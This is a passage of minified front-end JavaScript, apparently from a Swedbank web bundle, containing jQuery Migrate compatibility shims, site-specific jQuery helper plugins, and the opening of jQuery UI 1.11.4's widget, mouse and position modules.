migrateWarn("jQuery.fn.size() is deprecated; use the .length property"),this.length};var internalSwapCall=!1;jQuery.swap&&jQuery.each(["height","width","reliableMarginRight"],(function(_,name){var oldHook=jQuery.cssHooks[name]&&jQuery.cssHooks[name].get;oldHook&&(jQuery.cssHooks[name].get=function(){var ret;return internalSwapCall=!0,ret=oldHook.apply(this,arguments),internalSwapCall=!1,ret})})),jQuery.swap=function(elem,options,callback,args){var ret,name,old={};for(name in internalSwapCall||migrateWarn("jQuery.swap() is undocumented and deprecated"),options)old[name]=elem.style[name],elem.style[name]=options[name];for(name in ret=callback.apply(elem,args||[]),options)elem.style[name]=old[name];return ret},jQuery.ajaxSetup({converters:{"text json":jQuery.parseJSON}});var oldFnData=jQuery.fn.data;jQuery.fn.data=function(name){var ret,evt,elem=this[0];return!elem||"events"!==name||1!==arguments.length||(ret=jQuery.data(elem,name),evt=jQuery._data(elem,name),undefined!==ret&&ret!==evt||undefined===evt)?oldFnData.apply(this,arguments):(migrateWarn("Use of jQuery.fn.data('events') is deprecated"),evt)};var rscriptType=/\/(java|ecma)script/i;jQuery.clean||(jQuery.clean=function(elems,context,fragment,scripts){context=(context=!(context=context||document).nodeType&&context[0]||context).ownerDocument||context,migrateWarn("jQuery.clean() is deprecated");var i,elem,handleScript,jsTags,ret=[];if(jQuery.merge(ret,jQuery.buildFragment(elems,context).childNodes),fragment)for(handleScript=function(elem){if(!elem.type||rscriptType.test(elem.type))return scripts?scripts.push(elem.parentNode?elem.parentNode.removeChild(elem):elem):fragment.appendChild(elem)},i=0;null!=(elem=ret[i]);i++)jQuery.nodeName(elem,"script")&&handleScript(elem)||(fragment.appendChild(elem),void 0!==elem.getElementsByTagName&&(jsTags=jQuery.grep(jQuery.merge([],elem.getElementsByTagName("script")),handleScript),ret.splice.apply(ret,[i+1,0].concat(jsTags)),i+=jsTags.length));return ret});var eventAdd=jQuery.event.add,eventRemove=jQuery.event.remove,eventTrigger=jQuery.event.trigger,oldToggle=jQuery.fn.toggle,oldLive=jQuery.fn.live,oldDie=jQuery.fn.die,oldLoad=jQuery.fn.load,ajaxEvents="ajaxStart|ajaxStop|ajaxSend|ajaxComplete|ajaxError|ajaxSuccess",rajaxEvent=new RegExp("\\b(?:"+ajaxEvents+")\\b"),rhoverHack=/(?:^|\s)hover(\.\S+|)\b/,hoverHack=function(events){return"string"!=typeof events||jQuery.event.special.hover?events:(rhoverHack.test(events)&&migrateWarn("'hover' pseudo-event is deprecated, use 'mouseenter mouseleave'"),events&&events.replace(rhoverHack,"mouseenter$1 mouseleave$1"))};jQuery.event.props&&"attrChange"!==jQuery.event.props[0]&&jQuery.event.props.unshift("attrChange","attrName","relatedNode","srcElement"),jQuery.event.dispatch&&migrateWarnProp(jQuery.event,"handle",jQuery.event.dispatch,"jQuery.event.handle is undocumented and deprecated"),jQuery.event.add=function(elem,types,handler,data,selector){elem!==document&&rajaxEvent.test(types)&&migrateWarn("AJAX events should be attached to document: "+types),eventAdd.call(this,elem,hoverHack(types||""),handler,data,selector)},jQuery.event.remove=function(elem,types,handler,selector,mappedTypes){eventRemove.call(this,elem,hoverHack(types)||"",handler,selector,mappedTypes)},jQuery.each(["load","unload","error"],(function(_,name){jQuery.fn[name]=function(){var args=Array.prototype.slice.call(arguments,0);return"load"===name&&"string"==typeof args[0]?oldLoad.apply(this,args):(migrateWarn("jQuery.fn."+name+"() is deprecated"),args.splice(0,0,name),arguments.length?this.bind.apply(this,args):(this.triggerHandler.apply(this,args),this))}})),jQuery.fn.toggle=function(fn,fn2){if(!jQuery.isFunction(fn)||!jQuery.isFunction(fn2))return oldToggle.apply(this,arguments);migrateWarn("jQuery.fn.toggle(handler, handler...) is deprecated");var args=arguments,guid=fn.guid||jQuery.guid++,i=0,toggler=function(event){var lastToggle=(jQuery._data(this,"lastToggle"+fn.guid)||0)%i;return jQuery._data(this,"lastToggle"+fn.guid,lastToggle+1),event.preventDefault(),args[lastToggle].apply(this,arguments)||!1};for(toggler.guid=guid;i<args.length;)args[i++].guid=guid;return this.click(toggler)},jQuery.fn.live=function(types,data,fn){return migrateWarn("jQuery.fn.live() is deprecated"),oldLive?oldLive.apply(this,arguments):(jQuery(this.context).on(types,this.selector,data,fn),this)},jQuery.fn.die=function(types,fn){return migrateWarn("jQuery.fn.die() is deprecated"),oldDie?oldDie.apply(this,arguments):(jQuery(this.context).off(types,this.selector||"**",fn),this)},jQuery.event.trigger=function(event,data,elem,onlyHandlers){return elem||rajaxEvent.test(event)||migrateWarn("Global events are undocumented and deprecated"),eventTrigger.call(this,event,data,elem||document,onlyHandlers)},jQuery.each(ajaxEvents.split("|"),(function(_,name){jQuery.event.special[name]={setup:function(){var elem=this;return elem!==document&&(jQuery.event.add(document,name+"."+jQuery.guid,(function(){jQuery.event.trigger(name,Array.prototype.slice.call(arguments,1),elem,!0)})),jQuery._data(this,name,jQuery.guid++)),!1},teardown:function(){return this!==document&&jQuery.event.remove(document,name+"."+jQuery._data(this,name)),!1}}})),jQuery.event.special.ready={setup:function(){this===document&&migrateWarn("'ready' event is deprecated")}};var oldSelf=jQuery.fn.andSelf||jQuery.fn.addBack,oldFnFind=jQuery.fn.find;if(jQuery.fn.andSelf=function(){return migrateWarn("jQuery.fn.andSelf() replaced by jQuery.fn.addBack()"),oldSelf.apply(this,arguments)},jQuery.fn.find=function(selector){var ret=oldFnFind.apply(this,arguments);return ret.context=this.context,ret.selector=this.selector?this.selector+" "+selector:selector,ret},jQuery.Callbacks){var oldDeferred=jQuery.Deferred,tuples=[["resolve","done",jQuery.Callbacks("once memory"),jQuery.Callbacks("once memory"),"resolved"],["reject","fail",jQuery.Callbacks("once memory"),jQuery.Callbacks("once memory"),"rejected"],["notify","progress",jQuery.Callbacks("memory"),jQuery.Callbacks("memory")]];jQuery.Deferred=function(func){var deferred=oldDeferred(),promise=deferred.promise();return deferred.pipe=promise.pipe=function(){var fns=arguments;return migrateWarn("deferred.pipe() is deprecated"),jQuery.Deferred((function(newDefer){jQuery.each(tuples,(function(i,tuple){var fn=jQuery.isFunction(fns[i])&&fns[i];deferred[tuple[1]]((function(){var returned=fn&&fn.apply(this,arguments);returned&&jQuery.isFunction(returned.promise)?returned.promise().done(newDefer.resolve).fail(newDefer.reject).progress(newDefer.notify):newDefer[tuple[0]+"With"](this===promise?newDefer.promise():this,fn?[returned]:arguments)}))})),fns=null})).promise()},deferred.isResolved=function(){return migrateWarn("deferred.isResolved is deprecated"),"resolved"===deferred.state()},deferred.isRejected=function(){return migrateWarn("deferred.isRejected is deprecated"),"rejected"===deferred.state()},func&&func.call(deferred,deferred),deferred}}}(jQuery,window),jQuery.noConflict(),function($){$.fn.clear=function(){return this.val("")},$.convertQueryParamsToObject=function(string){return(string||location.search).replace(/(^\?)/,"").split("&").map(function(param){var key=param.split("=")[0],value=param.split("=")[1];return this[key]=value,this}.bind({}))[0]},$.fn.enable=function(){return this.prop("disabled",!1)},$.fn.disable=function(){return this.prop("disabled",!0)},$.fn.getZIndex=function(){var zIndex=this.css("z-index");return"auto"==zIndex&&this.parents().each((function(){if($.isNumeric($(this).css("z-index")))return zIndex=$(this).css("z-index"),!1})),"auto"==zIndex&&(zIndex=0),Number(zIndex)},$.renderList=function(listItems){var $list=$("<ul/>");return listItems.forEach((function(item){$list.appendAsListItem(item)})),$list},$.fn.scrollTo=function(duration,offsetAdjustment){duration=duration||"slow",offsetAdjustment=offsetAdjustment||-40,void 0!==this.offset()&&$("html, body").animate({scrollTop:this.offset().top+offsetAdjustment},duration)};var MAX_LENGTH_SUPPORTED_NATIVELY="maxLength"in document.createElement("textarea");function wrapAsListItem(element,attributes){var $element=element;return!element instanceof jQuery&&(methodName.endsWith("To")||"string"!=typeof element||element.trim().startsWith("<")||(element=document.createTextNode(element)),$element=$(element)),$element=$("<li>",attributes).html($element)}$.fn.characterCounter=function(maximumCharacters){return this.filter("textarea:not(.cc-textarea)").each((function(){var $textarea=$(this).addClass("cc-textarea");"number"==typeof maximumCharacters&&$textarea.attr("maxlength",maximumCharacters);var maxLength=$textarea.attr("maxlength");if(maxLength){var $counter=$('<p class="cc-counter"/>').insertAfter($textarea);$textarea.on("keyup paste",(function(){setTimeout(updateCharsLeft,0)})),$textarea.trigger("keyup")}function updateCharsLeft(){var value=$textarea.val();!MAX_LENGTH_SUPPORTED_NATIVELY&&value.length>maxLength&&(value=value.substr(0,maxLength),$textarea.val(value));var charsLeft=maxLength-value.length,limitAlmostReached=charsLeft>0&&charsLeft<.05*maxLength;$counter.text(Swedbank.Labels("charactersRemaining",charsLeft)).toggleClass("cc-warning",limitAlmostReached).toggleClass("cc-limit-reached",0===charsLeft)}})),this},$.fn.appendAsListItem=function(element,attributes){return this.append(wrapAsListItem(element,attributes))},$.fn.prependAsListItem=function(element,attributes){return this.prepend(wrapAsListItem(element,attributes))},$.fn.appendAsListItemTo=function(target,attributes){return wrapAsListItem(this,attributes).appendTo(target)},$.fn.prependAsListItemTo=function(target,attributes){return wrapAsListItem(this,attributes).prependTo(target)},$.fn.center=function(animate){var method=animate?"animate":"css",$window=$(window),viewportWidth=$window.width(),viewportHeight=$window.innerHeight();return this.each((function(){var $element=$(this),remainingVerticalSpace=viewportHeight-$element.outerHeight(),remainingHorizontalSpace=viewportWidth-$element.outerWidth();$element[method]({top:remainingVerticalSpace>=20?remainingVerticalSpace/2:10,left:remainingHorizontalSpace>=20?remainingHorizontalSpace/2:10,right:remainingHorizontalSpace>=20?remainingHorizontalSpace/2:10,bottom:remainingVerticalSpace>=20?"auto":10})}))},$.fn.setDefault=function(eventName,selector,callback){callback=callback||selector;var func=function(event){event.preventDefault(),callback.apply(this,arguments)};return"string"==typeof selector?this.on(eventName,selector,func):this.on(eventName,func)},$.fn.field=$.fn.findByName=function(fieldName){return this.find(':input[name="'+fieldName+'"]')},$.fn.copyAttributesFrom=function(obj,attributes){return"string"==typeof attributes&&(attributes=attributes.split(" ")),attributes.forEach((function(attributeName){var value=obj[attributeName];value&&this.attr(attributeName,value)}),this),this},$.fn.parseAsJSON=function(){var params={},$form=this;return this.find(":input[name]").each((function(){var $field=$(this);$field.is(":radio")?this.name in params||(params[this.name]=$form.field(this.name).filter(":checked").val()):params[this.name]=$field.is(":checkbox")?!0===this.checked:this.value})),params},$.fn.parseAsNonButtonJSON=function(){var params={},$form=this;return this.find(":input[name]").each((function(){var $field=$(this);if($field.is(":button"))return!0;$field.is(":radio")?this.name in params||(params[this.name]=$form.field(this.name).filter(":checked").val()):params[this.name]=$field.is(":checkbox")?!0===this.checked:this.value})),params},$.fn.offsetInViewport=function(){var offset=this.offset();return offset.top-=$(window).scrollTop(),offset},$.fn.calculateTotalWidth=function(){var totalWidth=0;return this.each((function(){totalWidth+=$(this).outerWidth()})),totalWidth},$.fn.exists=function(){return this.length>0},$.fn.isInside=function(parentSelector){return this.closest(parentSelector).length>0},$.fn.setReadOnly=function(){var value="select-one"==this.prop("type")?this.children("option:selected").text():this.val(),textElementId=this.attr("id")+"Static",$textElement=this.next("#"+textElementId);this.hide(),$textElement.exists()?$textElement.text(value):$("<span>",{id:textElementId,text:value}).insertAfter(this)},$.fn.unsetReadOnly=function(){var textElementId=this.attr("id")+"Static";this.show(),this.next("#"+textElementId).remove()},$.fn.switchClass||($.fn.switchClass=function(oldClass,newClass){return this.each((function(){$(this).removeClass(oldClass).addClass(newClass)}))})}(jQuery),function(factory){"function"==typeof define&&define.amd?define(["jquery"],factory):factory(jQuery)}((function($){var uuid,removeData,eventType,orig;function focusable(element,isTabIndexNotNaN){var map,mapName,img,nodeName=element.nodeName.toLowerCase();return"area"===nodeName?(mapName=(map=element.parentNode).name,!(!element.href||!mapName||"map"!==map.nodeName.toLowerCase())&&(!!(img=$("img[usemap='#"+mapName+"']")[0])&&visible(img))):(/^(input|select|textarea|button|object)$/.test(nodeName)?!element.disabled:"a"===nodeName&&element.href||isTabIndexNotNaN)&&visible(element)}function visible(element){return $.expr.filters.visible(element)&&!$(element).parents().addBack().filter((function(){return"hidden"===$.css(this,"visibility")})).length}$.ui=$.ui||{},$.extend($.ui,{version:"1.11.4",keyCode:{BACKSPACE:8,COMMA:188,DELETE:46,DOWN:40,END:35,ENTER:13,ESCAPE:27,HOME:36,LEFT:37,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,RIGHT:39,SPACE:32,TAB:9,UP:38}}),$.fn.extend({scrollParent:function(includeHidden){var position=this.css("position"),excludeStaticParent="absolute"===position,overflowRegex=includeHidden?/(auto|scroll|hidden)/:/(auto|scroll)/,scrollParent=this.parents().filter((function(){var parent=$(this);return(!excludeStaticParent||"static"!==parent.css("position"))&&overflowRegex.test(parent.css("overflow")+parent.css("overflow-y")+parent.css("overflow-x"))})).eq(0);return"fixed"!==position&&scrollParent.length?scrollParent:$(this[0].ownerDocument||document)},uniqueId:(uuid=0,function(){return this.each((function(){this.id||(this.id="ui-id-"+ ++uuid)}))}),removeUniqueId:function(){return this.each((function(){/^ui-id-\d+$/.test(this.id)&&$(this).removeAttr("id")}))}}),$.extend($.expr[":"],{data:$.expr.createPseudo?$.expr.createPseudo((function(dataName){return function(elem){return!!$.data(elem,dataName)}})):function(elem,i,match){return!!$.data(elem,match[3])},focusable:function(element){return focusable(element,!isNaN($.attr(element,"tabindex")))},tabbable:function(element){var tabIndex=$.attr(element,"tabindex"),isTabIndexNaN=isNaN(tabIndex);return(isTabIndexNaN||tabIndex>=0)&&focusable(element,!isTabIndexNaN)}}),$("<a>").outerWidth(1).jquery||$.each(["Width","Height"],(function(i,name){var side="Width"===name?["Left","Right"]:["Top","Bottom"],type=name.toLowerCase(),orig={innerWidth:$.fn.innerWidth,innerHeight:$.fn.innerHeight,outerWidth:$.fn.outerWidth,outerHeight:$.fn.outerHeight};function reduce(elem,size,border,margin){return $.each(side,(function(){size-=parseFloat($.css(elem,"padding"+this))||0,border&&(size-=parseFloat($.css(elem,"border"+this+"Width"))||0),margin&&(size-=parseFloat($.css(elem,"margin"+this))||0)})),size}$.fn["inner"+name]=function(size){return void 0===size?orig["inner"+name].call(this):this.each((function(){$(this).css(type,reduce(this,size)+"px")}))},$.fn["outer"+name]=function(size,margin){return"number"!=typeof size?orig["outer"+name].call(this,size):this.each((function(){$(this).css(type,reduce(this,size,!0,margin)+"px")}))}})),$.fn.addBack||($.fn.addBack=function(selector){return this.add(null==selector?this.prevObject:this.prevObject.filter(selector))}),$("<a>").data("a-b","a").removeData("a-b").data("a-b")&&($.fn.removeData=(removeData=$.fn.removeData,function(key){return arguments.length?removeData.call(this,$.camelCase(key)):removeData.call(this)})),$.ui.ie=!!/msie [\w.]+/.exec(navigator.userAgent.toLowerCase()),$.fn.extend({focus:(orig=$.fn.focus,function(delay,fn){return"number"==typeof delay?this.each((function(){var elem=this;setTimeout((function(){$(elem).focus(),fn&&fn.call(elem)}),delay)})):orig.apply(this,arguments)}),disableSelection:(eventType="onselectstart"in document.createElement("div")?"selectstart":"mousedown",function(){return this.bind(eventType+".ui-disableSelection",(function(event){event.preventDefault()}))}),enableSelection:function(){return this.unbind(".ui-disableSelection")},zIndex:function(zIndex){if(void 0!==zIndex)return this.css("zIndex",zIndex);if(this.length)for(var position,value,elem=$(this[0]);elem.length&&elem[0]!==document;){if(("absolute"===(position=elem.css("position"))||"relative"===position||"fixed"===position)&&(value=parseInt(elem.css("zIndex"),10),!isNaN(value)&&0!==value))return value;elem=elem.parent()}return 0}}),$.ui.plugin={add:function(module,option,set){var i,proto=$.ui[module].prototype;for(i in set)proto.plugins[i]=proto.plugins[i]||[],proto.plugins[i].push([option,set[i]])},call:function(instance,name,args,allowDisconnected){var i,set=instance.plugins[name];if(set&&(allowDisconnected||instance.element[0].parentNode&&11!==instance.element[0].parentNode.nodeType))for(i=0;i<set.length;i++)instance.options[set[i][0]]&&set[i][1].apply(instance.element,args)}};var widget_uuid=0,widget_slice=Array.prototype.slice;$.cleanData=function(orig){return function(elems){var events,elem,i;for(i=0;null!=(elem=elems[i]);i++)try{(events=$._data(elem,"events"))&&events.remove&&$(elem).triggerHandler("remove")}catch(e){}orig(elems)}}($.cleanData),$.widget=function(name,base,prototype){var fullName,existingConstructor,constructor,basePrototype,proxiedPrototype={},namespace=name.split(".")[0];return name=name.split(".")[1],fullName=namespace+"-"+name,prototype||(prototype=base,base=$.Widget),$.expr[":"][fullName.toLowerCase()]=function(elem){return!!$.data(elem,fullName)},$[namespace]=$[namespace]||{},existingConstructor=$[namespace][name],constructor=$[namespace][name]=function(options,element){if(!this._createWidget)return new constructor(options,element);arguments.length&&this._createWidget(options,element)},$.extend(constructor,existingConstructor,{version:prototype.version,_proto:$.extend({},prototype),_childConstructors:[]}),(basePrototype=new base).options=$.widget.extend({},basePrototype.options),$.each(prototype,(function(prop,value){var _super,_superApply;$.isFunction(value)?proxiedPrototype[prop]=(_super=function(){return base.prototype[prop].apply(this,arguments)},_superApply=function(args){return base.prototype[prop].apply(this,args)},function(){var returnValue,__super=this._super,__superApply=this._superApply;return this._super=_super,this._superApply=_superApply,returnValue=value.apply(this,arguments),this._super=__super,this._superApply=__superApply,returnValue}):proxiedPrototype[prop]=value})),constructor.prototype=$.widget.extend(basePrototype,{widgetEventPrefix:existingConstructor&&basePrototype.widgetEventPrefix||name},proxiedPrototype,{constructor:constructor,namespace:namespace,widgetName:name,widgetFullName:fullName}),existingConstructor?($.each(existingConstructor._childConstructors,(function(i,child){var childPrototype=child.prototype;$.widget(childPrototype.namespace+"."+childPrototype.widgetName,constructor,child._proto)})),delete existingConstructor._childConstructors):base._childConstructors.push(constructor),$.widget.bridge(name,constructor),constructor},$.widget.extend=function(target){for(var key,value,input=widget_slice.call(arguments,1),inputIndex=0,inputLength=input.length;inputIndex<inputLength;inputIndex++)for(key in input[inputIndex])value=input[inputIndex][key],input[inputIndex].hasOwnProperty(key)&&void 0!==value&&($.isPlainObject(value)?target[key]=$.isPlainObject(target[key])?$.widget.extend({},target[key],value):$.widget.extend({},value):target[key]=value);return target},$.widget.bridge=function(name,object){var fullName=object.prototype.widgetFullName||name;$.fn[name]=function(options){var isMethodCall="string"==typeof options,args=widget_slice.call(arguments,1),returnValue=this;return isMethodCall?this.each((function(){var methodValue,instance=$.data(this,fullName);return"instance"===options?(returnValue=instance,!1):instance?$.isFunction(instance[options])&&"_"!==options.charAt(0)?(methodValue=instance[options].apply(instance,args))!==instance&&void 0!==methodValue?(returnValue=methodValue&&methodValue.jquery?returnValue.pushStack(methodValue.get()):methodValue,!1):void 0:$.error("no such method '"+options+"' for "+name+" widget instance"):$.error("cannot call methods on "+name+" prior to initialization; attempted to call method '"+options+"'")})):(args.length&&(options=$.widget.extend.apply(null,[options].concat(args))),this.each((function(){var instance=$.data(this,fullName);instance?(instance.option(options||{}),instance._init&&instance._init()):$.data(this,fullName,new object(options,this))}))),returnValue}},$.Widget=function(){},$.Widget._childConstructors=[],$.Widget.prototype={widgetName:"widget",widgetEventPrefix:"",defaultElement:"<div>",options:{disabled:!1,create:null},_createWidget:function(options,element){element=$(element||this.defaultElement||this)[0],this.element=$(element),this.uuid=widget_uuid++,this.eventNamespace="."+this.widgetName+this.uuid,this.bindings=$(),this.hoverable=$(),this.focusable=$(),element!==this&&($.data(element,this.widgetFullName,this),this._on(!0,this.element,{remove:function(event){event.target===element&&this.destroy()}}),this.document=$(element.style?element.ownerDocument:element.document||element),this.window=$(this.document[0].defaultView||this.document[0].parentWindow)),this.options=$.widget.extend({},this.options,this._getCreateOptions(),options),this._create(),this._trigger("create",null,this._getCreateEventData()),this._init()},_getCreateOptions:$.noop,_getCreateEventData:$.noop,_create:$.noop,_init:$.noop,destroy:function(){this._destroy(),this.element.unbind(this.eventNamespace).removeData(this.widgetFullName).removeData($.camelCase(this.widgetFullName)),this.widget().unbind(this.eventNamespace).removeAttr("aria-disabled").removeClass(this.widgetFullName+"-disabled ui-state-disabled"),this.bindings.unbind(this.eventNamespace),this.hoverable.removeClass("ui-state-hover"),this.focusable.removeClass("ui-state-focus")},_destroy:$.noop,widget:function(){return this.element},option:function(key,value){var parts,curOption,i,options=key;if(0===arguments.length)return $.widget.extend({},this.options);if("string"==typeof key)if(options={},parts=key.split("."),key=parts.shift(),parts.length){for(curOption=options[key]=$.widget.extend({},this.options[key]),i=0;i<parts.length-1;i++)curOption[parts[i]]=curOption[parts[i]]||{},curOption=curOption[parts[i]];if(key=parts.pop(),1===arguments.length)return void 0===curOption[key]?null:curOption[key];curOption[key]=value}else{if(1===arguments.length)return void 0===this.options[key]?null:this.options[key];options[key]=value}return this._setOptions(options),this},_setOptions:function(options){var key;for(key in options)this._setOption(key,options[key]);return this},_setOption:function(key,value){return this.options[key]=value,"disabled"===key&&(this.widget().toggleClass(this.widgetFullName+"-disabled",!!value),value&&(this.hoverable.removeClass("ui-state-hover"),this.focusable.removeClass("ui-state-focus"))),this},enable:function(){return this._setOptions({disabled:!1})},disable:function(){return this._setOptions({disabled:!0})},_on:function(suppressDisabledCheck,element,handlers){var delegateElement,instance=this;"boolean"!=typeof suppressDisabledCheck&&(handlers=element,element=suppressDisabledCheck,suppressDisabledCheck=!1),handlers?(element=delegateElement=$(element),this.bindings=this.bindings.add(element)):(handlers=element,element=this.element,delegateElement=this.widget()),$.each(handlers,(function(event,handler){function handlerProxy(){if(suppressDisabledCheck||!0!==instance.options.disabled&&!$(this).hasClass("ui-state-disabled"))return("string"==typeof handler?instance[handler]:handler).apply(instance,arguments)}"string"!=typeof handler&&(handlerProxy.guid=handler.guid=handler.guid||handlerProxy.guid||$.guid++);var match=event.match(/^([\w:-]*)\s*(.*)$/),eventName=match[1]+instance.eventNamespace,selector=match[2];selector?delegateElement.delegate(selector,eventName,handlerProxy):(element.bind(eventName,handlerProxy),Swedbank.PageLoad.onUnload((function(){element.unbind(eventName,handlerProxy)})))}))},_off:function(element,eventName){eventName=(eventName||"").split(" ").join(this.eventNamespace+" ")+this.eventNamespace,element.unbind(eventName).undelegate(eventName),this.bindings=$(this.bindings.not(element).get()),this.focusable=$(this.focusable.not(element).get()),this.hoverable=$(this.hoverable.not(element).get())},_delay:function(handler,delay){var instance=this;return setTimeout((function handlerProxy(){return("string"==typeof handler?instance[handler]:handler).apply(instance,arguments)}),delay||0)},_hoverable:function(element){this.hoverable=this.hoverable.add(element),this._on(element,{mouseenter:function(event){$(event.currentTarget).addClass("ui-state-hover")},mouseleave:function(event){$(event.currentTarget).removeClass("ui-state-hover")}})},_focusable:function(element){this.focusable=this.focusable.add(element),this._on(element,{focusin:function(event){$(event.currentTarget).addClass("ui-state-focus")},focusout:function(event){$(event.currentTarget).removeClass("ui-state-focus")}})},_trigger:function(type,event,data){var prop,orig,callback=this.options[type];if(data=data||{},(event=$.Event(event)).type=(type===this.widgetEventPrefix?type:this.widgetEventPrefix+type).toLowerCase(),event.target=this.element[0],orig=event.originalEvent)for(prop in orig)prop in event||(event[prop]=orig[prop]);return this.element.trigger(event,data),!($.isFunction(callback)&&!1===callback.apply(this.element[0],[event].concat(data))||event.isDefaultPrevented())}},$.each({show:"fadeIn",hide:"fadeOut"},(function(method,defaultEffect){$.Widget.prototype["_"+method]=function(element,options,callback){"string"==typeof options&&(options={effect:options});var hasOptions,effectName=options?!0===options||"number"==typeof options?defaultEffect:options.effect||defaultEffect:method;"number"==typeof(options=options||{})&&(options={duration:options}),hasOptions=!$.isEmptyObject(options),options.complete=callback,options.delay&&element.delay(options.delay),hasOptions&&$.effects&&$.effects.effect[effectName]?element[method](options):effectName!==method&&element[effectName]?element[effectName](options.duration,options.easing,callback):element.queue((function(next){$(this)[method](),callback&&callback.call(element[0]),next()}))}}));$.widget;var mouseHandled=!1;$(document).mouseup((function(){mouseHandled=!1}));$.widget("ui.mouse",{version:"1.11.4",options:{cancel:"input,textarea,button,select,option",distance:1,delay:0},_mouseInit:function(){var that=this;this.element.bind("mousedown."+this.widgetName,(function(event){return that._mouseDown(event)})).bind("click."+this.widgetName,(function(event){if(!0===$.data(event.target,that.widgetName+".preventClickEvent"))return $.removeData(event.target,that.widgetName+".preventClickEvent"),event.stopImmediatePropagation(),!1})),this.started=!1},_mouseDestroy:function(){this.element.unbind("."+this.widgetName),this._mouseMoveDelegate&&this.document.unbind("mousemove."+this.widgetName,this._mouseMoveDelegate).unbind("mouseup."+this.widgetName,this._mouseUpDelegate)},_mouseDown:function(event){if(!mouseHandled){this._mouseMoved=!1,this._mouseStarted&&this._mouseUp(event),this._mouseDownEvent=event;var that=this,btnIsLeft=1===event.which,elIsCancel=!("string"!=typeof this.options.cancel||!event.target.nodeName)&&$(event.target).closest(this.options.cancel).length;return!(btnIsLeft&&!elIsCancel&&this._mouseCapture(event))||(this.mouseDelayMet=!this.options.delay,this.mouseDelayMet||(this._mouseDelayTimer=setTimeout((function(){that.mouseDelayMet=!0}),this.options.delay)),this._mouseDistanceMet(event)&&this._mouseDelayMet(event)&&(this._mouseStarted=!1!==this._mouseStart(event),!this._mouseStarted)?(event.preventDefault(),!0):(!0===$.data(event.target,this.widgetName+".preventClickEvent")&&$.removeData(event.target,this.widgetName+".preventClickEvent"),this._mouseMoveDelegate=function(event){return that._mouseMove(event)},this._mouseUpDelegate=function(event){return that._mouseUp(event)},this.document.bind("mousemove."+this.widgetName,this._mouseMoveDelegate).bind("mouseup."+this.widgetName,this._mouseUpDelegate),event.preventDefault(),mouseHandled=!0,!0))}},_mouseMove:function(event){if(this._mouseMoved){if($.ui.ie&&(!document.documentMode||document.documentMode<9)&&!event.button)return this._mouseUp(event);if(!event.which)return this._mouseUp(event)}return(event.which||event.button)&&(this._mouseMoved=!0),this._mouseStarted?(this._mouseDrag(event),event.preventDefault()):(this._mouseDistanceMet(event)&&this._mouseDelayMet(event)&&(this._mouseStarted=!1!==this._mouseStart(this._mouseDownEvent,event),this._mouseStarted?this._mouseDrag(event):this._mouseUp(event)),!this._mouseStarted)},_mouseUp:function(event){return this.document.unbind("mousemove."+this.widgetName,this._mouseMoveDelegate).unbind("mouseup."+this.widgetName,this._mouseUpDelegate),this._mouseStarted&&(this._mouseStarted=!1,event.target===this._mouseDownEvent.target&&$.data(event.target,this.widgetName+".preventClickEvent",!0),this._mouseStop(event)),mouseHandled=!1,!1},_mouseDistanceMet:function(event){return Math.max(Math.abs(this._mouseDownEvent.pageX-event.pageX),Math.abs(this._mouseDownEvent.pageY-event.pageY))>=this.options.distance},_mouseDelayMet:function(){return this.mouseDelayMet},_mouseStart:function(){},_mouseDrag:function(){},_mouseStop:function(){},_mouseCapture:function(){return!0}});!function(){$.ui=$.ui||{};var cachedScrollbarWidth,supportsOffsetFractions,max=Math.max,abs=Math.abs,round=Math.round,rhorizontal=/left|center|right/,rvertical=/top|center|bottom/,roffset=/[\+\-]\d+(\.[\d]+)?%?/,rposition=/^\w+/,rpercent=/%$/,_position=$.fn.position;function getOffsets(offsets,width,height){return[parseFloat(offsets[0])*(rpercent.test(offsets[0])?width/100:1),parseFloat(offsets[1])*(rpercent.test(offsets[1])?height/100:1)]}function parseCss(element,property){return parseInt($.css(element,property),10)||0}$.position={scrollbarWidth:function(){if(void 0!==cachedScrollbarWidth)return cachedScrollbarWidth;var w1,w2,div=$("<div style='display:block;position:absolute;width:50px;height:50px;overflow:hidden;'><div style='height:100px;width:auto;'></div></div>"),innerDiv=div.children()[0];return $("body").append(div),w1=innerDiv.offsetWidth,div.css("overflow","scroll"),w1===(w2=innerDiv.offsetWidth)&&(w2=div[0].clientWidth),div.remove(),cachedScrollbarWidth=w1-w2},getScrollInfo:function(within){var overflowX=within.isWindow||within.isDocument?"":within.element.css("overflow-x"),overflowY=within.isWindow||within.isDocument?"":within.element.css("overflow-y"),hasOverflowX="scroll"===overflowX||"auto"===overflowX&&within.width<within.element[0].scrollWidth;return{width:"scroll"===overflowY||"auto"===overflowY&&within.height<within.element[0].scrollHeight?$.position.scrollbarWidth():0,height:hasOverflowX?$.position.scrollbarWidth():0}},getWithinInfo:function(element){var withinElement=$(element||window),isWindow=$.isWindow(withinElement[0]),isDocument=!!withinElement[0]&&9===withinElement[0].nodeType;return{element:withinElement,isWindow:isWindow,isDocument:isDocument,offset:withinElement.offset()||{left:0,top:0},scrollLeft:withinElement.scrollLeft(),scrollTop:withinElement.scrollTop(),width:isWindow||isDocument?withinElement.width():withinElement.outerWidth(),height:isWindow||isDocument?withinElement.height():withinElement.outerHeight()}}},$.fn.position=function(options){if(!options||!options.of)return _position.apply(this,arguments);options=$.extend({},options);var atOffset,targetWidth,targetHeight,targetOffset,basePosition,dimensions,target=$(options.of),within=$.position.getWithinInfo(options.within),scrollInfo=$.position.getScrollInfo(within),collision=(options.collision||"flip").split(" "),offsets={};return dimensions=function getDimensions(elem){var raw=elem[0];return 9===raw.nodeType?{width:elem.width(),height:elem.height(),offset:{top:0,left:0}}:$.isWindow(raw)?{width:elem.width(),height:elem.height(),offset:{top:elem.scrollTop(),left:elem.scrollLeft()}}:raw.preventDefault?{width:0,height:0,offset:{top:raw.pageY,left:raw.pageX}}:{width:elem.outerWidth(),height:elem.outerHeight(),offset:elem.offset()}}(target),target[0].preventDefault&&(options.at="left top"),targetWidth=dimensions.width,targetHeight=dimensions.height,targetOffset=dimensions.offset,basePosition=$.extend({},targetOffset),$.each(["my","at"],(function(){var horizontalOffset,verticalOffset,pos=(options[this]||"").split(" 